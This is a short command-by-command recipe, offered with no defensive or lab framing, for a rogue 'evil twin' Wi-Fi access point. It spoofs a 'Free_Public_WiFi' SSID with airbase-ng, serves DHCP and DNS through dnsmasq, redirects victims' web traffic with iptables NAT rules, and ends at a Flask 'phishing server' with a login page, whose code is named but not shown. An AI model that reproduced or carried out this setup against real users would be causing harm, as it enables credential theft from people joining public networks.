1️⃣ Prepare Wi-Fi Adapter

#Put the wireless card in monitor mode:

sudo airmon-ng check kill
sudo airmon-ng start wlan0

#Verify interface (e.g., wlan0mon):

iwconfig

2️⃣ Create Fake Access Point

#Broadcast a spoofed SSID:

sudo airbase-ng -e "Free_Public_WiFi" -c 6 wlan0mon  (This creates a new interface (at0).)

3️⃣ Assign IP Address

sudo ifconfig at0 10.0.0.1 netmask 255.255.255.0 up

4️⃣ Configure dnsmasq

#Edit /etc/dnsmasq.conf:

interface=at0
dhcp-range=10.0.0.10,10.0.0.50,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1

#Start dnsmasq:

sudo dnsmasq -C /etc/dnsmasq.conf -d

5️⃣ Setup iptables for Redirection

sudo iptables --flush
sudo iptables -t nat --flush
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:5000
sudo iptables -t nat -A POSTROUTING -j MASQUERADE

6️⃣ Flask Phishing Server

#create app.py
#templates/login.html

**once setup**
python3 app.py (in terminal)

